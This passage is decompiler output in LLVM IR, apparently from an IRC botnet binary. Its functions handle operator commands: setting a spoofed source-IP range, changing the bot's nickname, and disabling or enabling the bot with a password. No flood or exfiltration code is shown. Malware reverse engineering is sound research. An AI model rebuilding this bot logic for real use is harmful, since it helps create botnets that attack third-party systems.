  %v1_94cc = inttoptr i32 %v2_94c8 to i8*
  %v2_94cc = load i8, i8* %v1_94cc, align 1
  %v3_94d0 = inttoptr i32 %v3_94b0 to i8*
  store i8 %v2_94cc, i8* %v3_94d0, align 1
  %v0_94d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_94d4 = add i32 %v0_94d4, 1
  store i32 %v1_94d4, i32* %v2_9498.pre-phi, align 4
  br label %dec_label_pc_9538

dec_label_pc_94e4:                                ; preds = %dec_label_pc_9494
  %v2_94f8 = add i32 %storemerge868, %v2_9218
  %v1_94fc = inttoptr i32 %v2_94f8 to i8*
  %v2_94fc = load i8, i8* %v1_94fc, align 1
  store i32 %v3_9204, i32* %r1.global-to-local, align 4
  %v3_9508 = call i32 @putc_unlocked(i8 %v2_94fc, i32 %v3_9204)
  br label %dec_label_pc_9538

dec_label_pc_9510:                                ; preds = %dec_label_pc_947c
  store i32 %v2_8e44, i32* %r1.global-to-local, align 4
  %v2_9524 = add i32 %storemerge868, %v2_9218
  %v1_9528 = inttoptr i32 %v2_9524 to i8*
  %v2_9528 = load i8, i8* %v1_9528, align 1
  %v3_9528 = zext i8 %v2_9528 to i32
  store i32 %v3_9204, i32* %r1.global-to-local, align 4
  %v3_9534 = call i32 @__GI_fputc(i32 %v3_9528, i32 %v3_9204, i32 %storemerge868)
  br label %dec_label_pc_9538

dec_label_pc_9538:                                ; preds = %dec_label_pc_94e4, %dec_label_pc_94ac, %dec_label_pc_9510
  %v1_953c = add nuw nsw i32 %storemerge868, 1
  %v5_9550 = icmp slt i32 %v1_953c, %v4_9424
  br i1 %v5_9550, label %dec_label_pc_947c, label %dec_label_pc_9408

dec_label_pc_9558:                                ; preds = %dec_label_pc_9408
  %v1_955c = inttoptr i32 %v3_9204 to i16*
  %v2_955c = call i32 @__GI_fclose(i16* %v1_955c)
  %v1_9564 = call i32 @close(i32 %v3_8ef0)
  %v1_956c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_9570

dec_label_pc_9570:                                ; preds = %entry, %dec_label_pc_9558
  %v1_9578 = phi i32 [ %v1_8e8c, %entry ], [ %v1_956c, %dec_label_pc_9558 ]
  ret i32 %v1_9578

; uselistorder directives
  uselistorder i32 %storemerge868, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v4_9424, { 1, 0, 2, 3 }
  uselistorder i32* %v2_9498.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v1_9388, { 1, 0 }
  uselistorder i32 %storemerge778, { 1, 0, 4, 3, 2 }
  uselistorder i32 %storemerge688, { 1, 0, 2 }
  uselistorder i32 %v4_922c, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_9218, { 0, 1, 2, 3, 10, 9, 4, 5, 6, 7, 8, 12, 11 }
  uselistorder i32 %v3_9204, { 14, 13, 12, 11, 10, 0, 1, 2, 8, 7, 4, 3, 6, 5, 9 }
  uselistorder i32 %v2_9138, { 1, 0 }
  uselistorder i32 %storemerge5, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_8ff8.pre-phi, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_8e44, { 8, 7, 9, 6, 5, 4, 10, 1, 0, 3, 11, 2, 12, 13 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32 %arg2, { 2, 3, 1, 4, 5, 0, 6, 7 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 5, 0 }
  uselistorder label %dec_label_pc_9570, { 1, 0 }
  uselistorder label %dec_label_pc_9538, { 2, 0, 1 }
  uselistorder label %dec_label_pc_947c, { 1, 0 }
  uselistorder label %dec_label_pc_93c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9384, { 2, 0, 1 }
  uselistorder label %dec_label_pc_92c8, { 1, 0 }
  uselistorder label %dec_label_pc_9284, { 1, 0 }
  uselistorder label %dec_label_pc_9188, { 1, 0 }
  uselistorder label %dec_label_pc_9120, { 1, 0 }
  uselistorder label %dec_label_pc_90ec, { 1, 0 }
  uselistorder label %dec_label_pc_9034, { 1, 0 }
  uselistorder label %dec_label_pc_8fec, { 1, 0 }
  uselistorder label %dec_label_pc_8fd4, { 1, 0 }
  uselistorder label %dec_label_pc_8f38, { 1, 0 }
  uselistorder label %dec_label_pc_8ee4, { 1, 0 }
}

define i32 @getspoofs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp25 = call i8 @__decompiler_undefined_function_4()
  %tmp26 = call i8 @__decompiler_undefined_function_4()
  %stack_var_-4 = alloca i32, align 4
  store i32 38320, i32* %stack_var_-4, align 4
  %v2_95ac = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_95ac, i32* @fp, align 4
  %v2_95d4 = load i32, i32* @global_var_49b44.49, align 4
  %v7_95f4 = icmp eq i32 %v2_95d4, 1
  br i1 %v7_95f4, label %dec_label_pc_95fc, label %dec_label_pc_9658

dec_label_pc_95fc:                                ; preds = %entry
  store i32 %arg2, i32* @r2, align 4
  %v3_9650 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_36d04.79 to i32))
  br label %dec_label_pc_96fc

dec_label_pc_9658:                                ; preds = %entry
  %v2_95c8 = load i8*, i8** @global_var_49b40.47, align 4
  %v3_95c8 = ptrtoint i8* %v2_95c8 to i32
  store i32 %v3_95c8, i32* @lr, align 4
  %v3_969c = sext i8 %tmp26 to i32
  store i32 %v3_969c, i32* @r4, align 4
  %v3_96ac = sext i8 %tmp25 to i32
  store i32 %v3_96ac, i32* @r5, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_96f8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_36d24.81 to i32))
  br label %dec_label_pc_96fc

dec_label_pc_96fc:                                ; preds = %dec_label_pc_95fc, %dec_label_pc_9658
  %storemerge = phi i32 [ %v3_96f8, %dec_label_pc_9658 ], [ %v3_9650, %dec_label_pc_95fc ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_96fc, { 1, 0 }
}

define i32 @version() local_unnamed_addr {
entry:
  %v2_9718 = load i32, i32* @r0, align 4
  ret i32 %v2_9718
}

define i32 @function_971c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_971c:
  %v6_971c = load i32, i32* @ip, align 4
  %v1_9720 = add i32 %v6_971c, -4
  store i32 %v1_9720, i32* @fp, align 4
  %v2_9728 = add i32 %v6_971c, -20
  %v3_9728 = inttoptr i32 %v2_9728 to i32*
  store i32 %arg1, i32* %v3_9728, align 4
  %v1_972c = load i32, i32* @fp, align 4
  %v2_972c = add i32 %v1_972c, -20
  %v3_972c = inttoptr i32 %v2_972c to i32*
  store i32 %arg2, i32* %v3_972c, align 4
  %v1_9730 = load i32, i32* @fp, align 4
  %v2_9730 = add i32 %v1_9730, -24
  %v3_9730 = inttoptr i32 %v2_9730 to i32*
  store i32 %arg3, i32* %v3_9730, align 4
  %v1_9734 = load i32, i32* @fp, align 4
  %v2_9734 = add i32 %v1_9734, -28
  %v3_9734 = inttoptr i32 %v2_9734 to i32*
  store i32 %arg4, i32* %v3_9734, align 4
  %v0_9738 = load i32, i32* @fp, align 4
  %v1_9738 = add i32 %v0_9738, -16
  %v2_9738 = inttoptr i32 %v1_9738 to i32*
  %v3_9738 = load i32, i32* %v2_9738, align 4
  %v1_9740 = add i32 %v0_9738, -20
  %v2_9740 = inttoptr i32 %v1_9740 to i32*
  %v3_9740 = load i32, i32* %v2_9740, align 4
  store i32 %v3_9740, i32* @r2, align 4
  %v3_9744 = call i32 @Send(i32 %v3_9738, i32 ptrtoint ([70 x i8]* @global_var_36d54.83 to i32))
  ret i32 %v3_9744
}

define i32 @nickc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 38756, i32* %stack_var_-4, align 4
  %v2_9760 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9760, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-32, align 4
  %v7_977c = icmp eq i32 %arg3, 1
  br i1 %v7_977c, label %dec_label_pc_9798, label %dec_label_pc_9784

dec_label_pc_9784:                                ; preds = %entry
  store i32 %arg2, i32* @r2, align 4
  %v3_9790 = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_36d9c.85 to i32))
  br label %dec_label_pc_97fc

dec_label_pc_9798:                                ; preds = %entry
  %v1_979c = add i32 %arg4, 4
  %v1_97a0 = inttoptr i32 %v1_979c to i32*
  %v2_97a0 = load i32, i32* %v1_97a0, align 4
  %v1_97a4 = inttoptr i32 %v2_97a0 to i8*
  %v3_97a8 = call i32 @strlen(i8* %v1_97a4)
  %tmp = icmp ult i32 %v3_97a8, 33
  br i1 %tmp, label %dec_label_pc_97cc, label %dec_label_pc_97b8

dec_label_pc_97b8:                                ; preds = %dec_label_pc_9798
  store i32 %arg2, i32* @r2, align 4
  %v3_97c4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_36db4.87 to i32))
  br label %dec_label_pc_97fc

dec_label_pc_97cc:                                ; preds = %dec_label_pc_9798
  %v3_97cc = load i32, i32* %stack_var_-32, align 4
  %v1_97d0 = add i32 %v3_97cc, 4
  %v1_97d4 = inttoptr i32 %v1_97d0 to i32*
  %v2_97d4 = load i32, i32* %v1_97d4, align 4
  store i32 %v2_97d4, i32* @global_var_52594.89, align 4
  %v2_97e8 = load i32, i32* %v1_97d4, align 4
  store i32 %v2_97e8, i32* @r2, align 4
  %v3_97f8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_36dec.91 to i32))
  br label %dec_label_pc_97fc

dec_label_pc_97fc:                                ; preds = %dec_label_pc_97b8, %dec_label_pc_9784, %dec_label_pc_97cc
  %v1_9804 = phi i32 [ %v3_97c4, %dec_label_pc_97b8 ], [ %v3_9790, %dec_label_pc_9784 ], [ %v3_97f8, %dec_label_pc_97cc ]
  ret i32 %v1_9804

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_97fc, { 2, 0, 1 }
}

define i32 @realrand(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v3_981c = load i32, i32* @r4, align 4
  %v6_981c = load i32, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  %v2_9834 = call i32 @__GI_time(i32* null)
  store i32 %v2_9834, i32* @r0, align 4
  store i32 %v2_9834, i32* @r4, align 4
  %v0_983c = call i32 @__GI_getpid()
  %v0_9844 = load i32, i32* @r4, align 4
  %v2_9844 = add i32 %v0_9844, %v0_983c
  %v1_984c = call i32 @srand(i32 %v2_9844)
  %v0_9850 = call i32 @rand()
  %v3_9858 = load i32, i32* %stack_var_-32, align 4
  %v1_985c = sub i32 1, %arg1
  %v2_9864 = add i32 %v1_985c, %v3_9858
  %v3_9870 = urem i32 %v0_9850, %v2_9864
  %v2_9880 = add i32 %v3_9870, %arg1
  store i32 %v3_981c, i32* @r4, align 4
  store i32 %v6_981c, i32* @fp, align 4
  ret i32 %v2_9880

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @rndnick(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 39072, i32* %stack_var_-4, align 4
  %v2_989c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_989c, i32* @fp, align 4
  %v2_98bc = call i32 @realrand(i32 4, i32 8)
  %v1_98c8 = call i32 @randstring(i32 %v2_98bc)
  store i32 %v1_98c8, i32* @global_var_52594.89, align 4
  %v1_98d8 = call i32 @getBuild(i32 %v1_98c8)
  store i32 ptrtoint ([8 x i8]* @global_var_36e08.96 to i32), i32* @r2, align 4
  %v3_98fc = call i32 @Send(i32 %arg1, i32 ptrtoint ([16 x i8]* @global_var_36df8.94 to i32))
  ret i32 %v3_98fc

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @disable(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 39204, i32* %stack_var_-4, align 4
  %v2_9920 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9920, i32* @fp, align 4
  %v7_993c = icmp eq i32 %arg3, 1
  br i1 %v7_993c, label %dec_label_pc_9990, label %dec_label_pc_9944

dec_label_pc_9944:                                ; preds = %entry
  store i32 %arg2, i32* @r2, align 4
  %v3_9950 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_36e10.98 to i32))
  store i32 %arg2, i32* @r2, align 4
  %v3_9988 = call i32 @Send(i32 %arg1, i32 ptrtoint ([34 x i8]* @global_var_36e54.105 to i32))
  br label %dec_label_pc_9a28

dec_label_pc_9990:                                ; preds = %entry
  %v2_9994 = load i8, i8* bitcast (i8** @global_var_49b3c.37 to i8*), align 4
  %v2_9998 = icmp eq i8 %v2_9994, 0
  br i1 %v2_9998, label %dec_label_pc_99b4, label %dec_label_pc_99a0

dec_label_pc_99a0:                                ; preds = %dec_label_pc_9990
  store i32 %arg2, i32* @r2, align 4
  %v3_99ac = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_36e78.107 to i32))
  br label %dec_label_pc_9a28

dec_label_pc_99b4:                                ; preds = %dec_label_pc_9990
  %v1_99b8 = add i32 %arg4, 4
  %v1_99bc = inttoptr i32 %v1_99b8 to i32*
  %v2_99bc = load i32, i32* %v1_99bc, align 4
  %v1_99c0 = inttoptr i32 %v2_99bc to i8*
  %v3_99c4 = call i32 @strlen(i8* %v1_99c0)
  %tmp = icmp ult i32 %v3_99c4, 255
  br i1 %tmp, label %dec_label_pc_99e8, label %dec_label_pc_99d4

dec_label_pc_99d4:                                ; preds = %dec_label_pc_99b4
  store i32 %arg2, i32* @r2, align 4
  %v3_99e0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_36e98.109 to i32))
  br label %dec_label_pc_9a28

dec_label_pc_99e8:                                ; preds = %dec_label_pc_99b4
  store i8 1, i8* bitcast (i8** @global_var_49b3c.37 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_52488.111 to i32), i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 256, i32* @r2, align 4
  %v0_9a00 = call i32 @__GI_memset()
  %v2_9a0c = load i32, i32* %v1_99bc, align 4
  store i32 %v2_9a0c, i32* @r1, align 4
  %v3_9a18 = call i32 @strcpy(i8* bitcast (i32* @global_var_52488.111 to i8*), i32 %v2_9a0c)
  %v3_9a24 = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_36ec0.113 to i32))
  br label %dec_label_pc_9a28

dec_label_pc_9a28:                                ; preds = %dec_label_pc_99d4, %dec_label_pc_99a0, %dec_label_pc_9944, %dec_label_pc_99e8
  %v1_9a30 = phi i32 [ %v3_99e0, %dec_label_pc_99d4 ], [ %v3_99ac, %dec_label_pc_99a0 ], [ %v3_9988, %dec_label_pc_9944 ], [ %v3_9a24, %dec_label_pc_99e8 ]
  ret i32 %v1_9a30

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_9a28, { 3, 0, 1, 2 }
}

define i32 @enable(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 39524, i32* %stack_var_-4, align 4
  %v2_9a60 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9a60, i32* @fp, align 4
  %v7_9a7c = icmp eq i32 %arg3, 1
  br i1 %v7_9a7c, label %dec_label_pc_9ad0, label %dec_label_pc_9a84

dec_label_pc_9a84:                                ; preds = %entry
  store i32 %arg2, i32* @r2, align 4
  %v3_9a90 = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_36ee0.115 to i32))
  store i32 %arg2, i32* @r2, align 4
  %v3_9ac8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([34 x i8]* @global_var_36e54.105 to i32))
  br label %dec_label_pc_9b48

dec_label_pc_9ad0:                                ; preds = %entry
  %v2_9ad4 = load i8, i8* bitcast (i8** @global_var_49b3c.37 to i8*), align 4
  %v2_9ad8 = icmp eq i8 %v2_9ad4, 0
  br i1 %v2_9ad8, label %dec_label_pc_9ae0, label %dec_label_pc_9af4

dec_label_pc_9ae0:                                ; preds = %dec_label_pc_9ad0
  store i32 %arg2, i32* @r2, align 4
  %v3_9aec = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_36efc.121 to i32))
  br label %dec_label_pc_9b48

dec_label_pc_9af4:                                ; preds = %dec_label_pc_9ad0
  %v1_9af8 = add i32 %arg4, 4
  %v1_9afc = inttoptr i32 %v1_9af8 to i32*
  %v2_9afc = load i32, i32* %v1_9afc, align 4
  %v3_9b08 = call i32 @__GI_strcasecmp(i8* bitcast (i32* @global_var_52488.111 to i8*), i32 %v2_9afc)
  %v2_9b10 = icmp eq i32 %v3_9b08, 0
  br i1 %v2_9b10, label %dec_label_pc_9b2c, label %dec_label_pc_9b18

dec_label_pc_9b18:                                ; preds = %dec_label_pc_9af4
  store i32 %arg2, i32* @r2, align 4
  %v3_9b24 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_36f1c.124 to i32))
  br label %dec_label_pc_9b48

dec_label_pc_9b2c:                                ; preds = %dec_label_pc_9af4
  store i8 0, i8* bitcast (i8** @global_var_49b3c.37 to i8*), align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9b44 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_36f38.126 to i32))
  br label %dec_label_pc_9b48

dec_label_pc_9b48:                                ; preds = %dec_label_pc_9b18, %dec_label_pc_9ae0, %dec_label_pc_9a84, %dec_label_pc_9b2c
  %v1_9b50 = phi i32 [ %v3_9b24, %dec_label_pc_9b18 ], [ %v3_9aec, %dec_label_pc_9ae0 ], [ %v3_9ac8, %dec_label_pc_9a84 ], [ %v3_9b44, %dec_label_pc_9b2c ]
  ret i32 %v1_9b50

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 4, 0, 1 }
  uselistorder i32 %arg1, { 3, 2, 4, 0, 1 }
  uselistorder label %dec_label_pc_9b48, { 3, 0, 1, 2 }
}

define i32 @spoof(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_9b78 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_9b78, i32* @ip, align 4
  store i32 39812, i32* %stack_var_-4, align 4
  %v2_9b80 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9b80, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-328, align 4
  %v7_9b9c = icmp eq i32 %arg3, 1
  br i1 %v7_9b9c, label %dec_label_pc_9bd0, label %dec_label_pc_9ba4

dec_label_pc_9ba4:                                ; preds = %entry
  store i32 %arg2, i32* @r2, align 4
  %v3_9bb0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_36f58.128 to i32))
  store i32 0, i32* bitcast (i8** @global_var_49b40.47 to i32*), align 4
  store i32 0, i32* @global_var_49b44.49, align 4
  br label %dec_label_pc_9db0

dec_label_pc_9bd0:                                ; preds = %entry
  %v1_9bd4 = add i32 %arg4, 4
  %v1_9bd8 = inttoptr i32 %v1_9bd4 to i32*
  %v2_9bd8 = load i32, i32* %v1_9bd8, align 4
  %v1_9bdc = inttoptr i32 %v2_9bd8 to i8*
  %v3_9be0 = call i32 @strlen(i8* %v1_9bdc)
  %tmp = icmp ult i32 %v3_9be0, 17
  br i1 %tmp, label %dec_label_pc_9c04, label %dec_label_pc_9bf0

dec_label_pc_9bf0:                                ; preds = %dec_label_pc_9bd0
  store i32 %arg2, i32* @r2, align 4
  %v3_9bfc = call i32 @Send(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_36f78.132 to i32))
  br label %dec_label_pc_9db0

dec_label_pc_9c04:                                ; preds = %dec_label_pc_9bd0
  %v3_9c04 = load i32, i32* %stack_var_-328, align 4
  %v1_9c08 = add i32 %v3_9c04, 4
  %v1_9c0c = inttoptr i32 %v1_9c08 to i32*
  %v2_9c0c = load i32, i32* %v1_9c0c, align 4
  %v2_9c10 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_9c0c, i32* @r1, align 4
  %v2_9c1c = bitcast i32* %stack_var_-292 to i8*
  %v3_9c1c = call i32 @strcpy(i8* %v2_9c1c, i32 %v2_9c0c)
  %v3_9c28 = call i32 @strlen(i8* %v2_9c1c)
  %v2_9c3c = ptrtoint i32* %stack_var_-24 to i32
  %v1_9c30 = add i32 %v2_9c3c, -1
  %v2_9c40 = add i32 %v1_9c30, %v3_9c28
  %v2_9c44 = add i32 %v2_9c40, -268
  %v1_9c48 = inttoptr i32 %v2_9c44 to i8*
  %v2_9c48 = load i8, i8* %v1_9c48, align 1
  %v7_9c4c = icmp eq i8 %v2_9c48, 46
  br i1 %v7_9c4c, label %dec_label_pc_9c54, label %dec_label_pc_9cd4

dec_label_pc_9c54:                                ; preds = %dec_label_pc_9c04
  %v3_9c5c = call i32 @strlen(i8* %v2_9c1c)
  %v1_9c64 = add i32 %v2_9c3c, -269
  %v2_9c78 = add i32 %v1_9c64, %v3_9c5c
  %v3_9c80 = inttoptr i32 %v2_9c78 to i8*
  store i8 0, i8* %v3_9c80, align 1
  br label %dec_label_pc_9cd4

dec_label_pc_9c98:                                ; preds = %dec_label_pc_9cd4
  %v2_9ca8 = add i32 %stack_var_-36.0, %v2_9c3c
  %v2_9cac = add i32 %v2_9ca8, -268
  %v1_9cb0 = inttoptr i32 %v2_9cac to i8*
  %v2_9cb0 = load i8, i8* %v1_9cb0, align 1
  %v7_9cb4 = icmp eq i8 %v2_9cb0, 46
  br i1 %v7_9cb4, label %dec_label_pc_9cbc, label %dec_label_pc_9cc8

dec_label_pc_9cbc:                                ; preds = %dec_label_pc_9c98
  %v1_9cc0 = add i32 %stack_var_-32.1, 1
  br label %dec_label_pc_9cc8

dec_label_pc_9cc8:                                ; preds = %dec_label_pc_9c98, %dec_label_pc_9cbc
  %stack_var_-32.0 = phi i32 [ %v1_9cc0, %dec_label_pc_9cbc ], [ %stack_var_-32.1, %dec_label_pc_9c98 ]
  %v1_9ccc = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_9cd4

dec_label_pc_9cd4:                                ; preds = %dec_label_pc_9c54, %dec_label_pc_9c04, %dec_label_pc_9cc8
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.0, %dec_label_pc_9cc8 ], [ 1, %dec_label_pc_9c04 ], [ 1, %dec_label_pc_9c54 ]
  %stack_var_-36.0 = phi i32 [ %v1_9ccc, %dec_label_pc_9cc8 ], [ 0, %dec_label_pc_9c04 ], [ 0, %dec_label_pc_9c54 ]
  store i32 %stack_var_-36.0, i32* @r4, align 4
  %v3_9ce0 = call i32 @strlen(i8* %v2_9c1c)
  %v0_9ce8 = load i32, i32* @r4, align 4
  %v3_9ce8 = icmp ult i32 %v0_9ce8, %v3_9ce0
  br i1 %v3_9ce8, label %dec_label_pc_9c98, label %dec_label_pc_9cf0

dec_label_pc_9cf0:                                ; preds = %dec_label_pc_9cd4
  %v1_9cf4 = sub i32 4, %stack_var_-32.1
  %v3_9d4425 = icmp eq i32 %v1_9cf4, 0
  %v5_9d4830 = icmp sgt i32 %v1_9cf4, 0
  br i1 %v5_9d4830, label %dec_label_pc_9d08, label %dec_label_pc_9d4c

dec_label_pc_9d08:                                ; preds = %dec_label_pc_9cf0, %dec_label_pc_9d08
  %storemerge231 = phi i32 [ %v1_9d34, %dec_label_pc_9d08 ], [ 0, %dec_label_pc_9cf0 ]
  store i32 %v2_9c10, i32* @r4, align 4
  %v3_9d14 = call i32 @strlen(i8* %v2_9c1c)
  %v0_9d1c = load i32, i32* @r4, align 4
  %v2_9d1c = add i32 %v0_9d1c, %v3_9d14
  store i32 %v2_9d1c, i32* @r3, align 4
  store i32 %v2_9d1c, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_36fc4.134 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  %v0_9d2c = call i32 @memcpy()
  %v1_9d34 = add nuw nsw i32 %storemerge231, 1
  %v5_9d48 = icmp slt i32 %v1_9d34, %v1_9cf4
  br i1 %v5_9d48, label %dec_label_pc_9d08, label %dec_label_pc_9d4c

dec_label_pc_9d4c:                                ; preds = %dec_label_pc_9d08, %dec_label_pc_9cf0
  %v2_9d54 = ptrtoint i32* %stack_var_-304 to i32
  %v3_9d60 = call i32 @inet_aton(i8* %v2_9c1c, i32 %v2_9d54)
  %v3_9d64 = load i32, i32* %stack_var_-304, align 4
  br i1 %v3_9d4425, label %dec_label_pc_9da4, label %dec_label_pc_9d88

dec_label_pc_9d88:                                ; preds = %dec_label_pc_9d4c
  %v2_9d90 = call i32 @poww(i32 256, i32 %v1_9cf4)
  br label %dec_label_pc_9da4

dec_label_pc_9da4:                                ; preds = %dec_label_pc_9d4c, %dec_label_pc_9d88
  %storemerge = phi i32 [ %v2_9d90, %dec_label_pc_9d88 ], [ 1, %dec_label_pc_9d4c ]
  %v1_9db87 = phi i32 [ %v2_9d90, %dec_label_pc_9d88 ], [ %v3_9d60, %dec_label_pc_9d4c ]
  store i32 %storemerge, i32* @global_var_49b44.49, align 4
  store i32 %v3_9d64, i32* bitcast (i8** @global_var_49b40.47 to i32*), align 4
  br label %dec_label_pc_9db0

dec_label_pc_9db0:                                ; preds = %dec_label_pc_9bf0, %dec_label_pc_9ba4, %dec_label_pc_9da4
  %v1_9db8 = phi i32 [ %v3_9bfc, %dec_label_pc_9bf0 ], [ %v3_9bb0, %dec_label_pc_9ba4 ], [ %v1_9db87, %dec_label_pc_9da4 ]
  ret i32 %v1_9db8

; uselistorder directives
  uselistorder i32 %v1_9d34, { 1, 0 }
  uselistorder i32 %v1_9cf4, { 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-36.0, { 2, 0, 1 }
  uselistorder i32 %stack_var_-32.1, { 0, 2, 1 }
  uselistorder i32 %v2_9c3c, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32)* @poww, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9db0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9da4, { 1, 0 }
  uselistorder label %dec_label_pc_9d08, { 1, 0 }
  uselistorder label %dec_label_pc_9cd4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9cc8, { 1, 0 }
}

define i32 @host2ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_9dd4 = load i32, i32* @fp, align 4
  store i32 40412, i32* %stack_var_-4, align 4
  %v2_9dd8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9dd8, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  store i32 %arg2, i32* @r0, align 4
  %v1_9dec = call i32 @inet_addr(i32 %arg2)
  store i32 %v1_9dec, i32* @global_var_49f4c.136, align 4
  %v3_9e04 = icmp eq i32 %v1_9dec, -1
  br i1 %v3_9e04, label %dec_label_pc_9e0c, label %dec_label_pc_9e70

dec_label_pc_9e0c:                                ; preds = %entry
  %v3_9e0c = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_9e0c, i32* @r0, align 4
  %v1_9e10 = call i32 @__GI_gethostbyname(i32 %v3_9e0c)
  %v2_9e20 = icmp eq i32 %v1_9e10, 0
  br i1 %v2_9e20, label %dec_label_pc_9e28, label %dec_label_pc_9e4c

dec_label_pc_9e28:                                ; preds = %dec_label_pc_9e0c
  %v2_9e2c = load i32, i32* @global_var_52598.39, align 4
  store i32 %arg1, i32* @r2, align 4
  %v3_9e40 = call i32 @Send(i32 %v2_9e2c, i32 ptrtoint ([33 x i8]* @global_var_36fc8.139 to i32))
  %v1_9e48 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_9e4c

dec_label_pc_9e4c:                                ; preds = %dec_label_pc_9e0c, %dec_label_pc_9e28
  %v1_9e50 = add i32 %v1_9e10, 16
  %v2_9e50 = inttoptr i32 %v1_9e50 to i32*
  %v3_9e50 = load i32, i32* %v2_9e50, align 4
  %v1_9e54 = inttoptr i32 %v3_9e50 to i32*
  %v2_9e54 = load i32, i32* %v1_9e54, align 4
  %v1_9e5c = add i32 %v1_9e10, 12
